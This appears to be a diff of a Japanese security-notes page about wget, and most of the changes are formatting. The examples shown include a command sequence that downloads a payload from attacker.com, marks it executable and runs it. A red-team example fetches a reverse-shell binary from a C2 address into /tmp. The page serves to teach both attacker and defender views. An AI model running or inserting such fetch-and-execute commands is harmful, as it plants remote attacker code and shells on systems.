@@ -1,7 +1,14 @@
 ---
-tags: ['wget' 'networking' 'file_transfer' 'curl' 'scp' 'sftp' 'bash']
+tags:
+  - 'wget'
+  - 'networking'
+  - 'file_transfer'
+  - 'curl'
+  - 'scp'
+  - 'sftp'
+  - 'bash'
 created: 2025-06-29 15:02
-modified: 2026-02-20 15:28
+modified: 2026-02-20 15:45
 environment: [OS/Linux]
 vulnearability: []
 knowledge_category: Command
@@ -34,25 +41,24 @@ knowledge_category: Command
 * **コマンド例**:
 
 		```bash
-    # このコマンドシーケンスでペイロードをダウンロード・実行する
-    # 1. /tmpディレクトリに移動
+		# このコマンドシーケンスでペイロードをダウンロード・実行する
+		# 1. /tmpディレクトリに移動
 
-    cd /tmp
+		cd /tmp
 
-    # 2. 攻撃者のサーバーからスクリプトをダウンロード
+		# 2. 攻撃者のサーバーからスクリプトをダウンロード
 
-    wget [http://attacker.com/payload.sh](http://attacker.com/payload.sh)
+		wget [http://attacker.com/payload.sh](http://attacker.com/payload.sh)
 
-    # 3. 実行権限を付与
+		# 3. 実行権限を付与
 
-    chmod +x payload.sh
+		chmod +x payload.sh
 
-    # 4. スクリプトを実行
+		# 4. スクリプトを実行
 
-    ./payload.sh
+		./payload.sh
 
-    ```
-
+		```
 
 ## オプション説明
 
@@ -82,14 +88,13 @@ knowledge_category: Command
 * **例**:
 
 		```bash
-    # Nginxのソースコードをダウンロードし、/usr/local/src/ ディレクトリに保存
+		# Nginxのソースコードをダウンロードし、/usr/local/src/ ディレクトリに保存
 
-    wget [http://nginx.org/download/nginx-1.26.0.tar.gz](http://nginx.org/download/nginx-1.26.0.tar.gz) -P /usr/local/src/
+		wget [http://nginx.org/download/nginx-1.26.0.tar.gz](http://nginx.org/download/nginx-1.26.0.tar.gz) -P /usr/local/src/
 
-    ```
+		```
 
-
-### 2. ブルーチーム視点
+## 2. ブルーチーム視点
 
 * **タスク**: マルウェアサンプルを安全な環境で収集する。
 * **組み合わせ**: `wget --no-check-certificate <malicious_url>`
@@ -97,14 +102,13 @@ knowledge_category: Command
 * **例**:
 
 		```bash
-    # サンドボックス環境でマルウェア検体を収集
+		# サンドボックス環境でマルウェア検体を収集
 
-    wget --no-check-certificate [https://evil-site.com/malware.exe](https://evil-site.com/malware.exe) -O sample1.exe
+		wget --no-check-certificate [https://evil-site.com/malware.exe](https://evil-site.com/malware.exe) -O sample1.exe
 
-    ```
+		```
 
-
-### 3. レッドチーム視点
+## 3. レッドチーム視点
 
 * **タスク**: **ペイロードの持ち込み**。侵入したサーバーに攻撃用のスクリプトやバイナリをダウンロードする。
 * **組み合わせ**: `wget <attacker_server>/payload -O /tmp/payload`
@@ -112,12 +116,11 @@ knowledge_category: Command
 * **例**:
 
 		```bash
-    # C2サーバーからリバースシェルバイナリをダウンロード
+		# C2サーバーからリバースシェルバイナリをダウンロード
 
-    wget [http://10.0.0.5/revshell](http://10.0.0.5/revshell) -O /tmp/revshell
+		wget [http://10.0.0.5/revshell](http://10.0.0.5/revshell) -O /tmp/revshell
 
-    ```
-
+		```
 
 ## エラーメッセージとトラブルシューティング
 
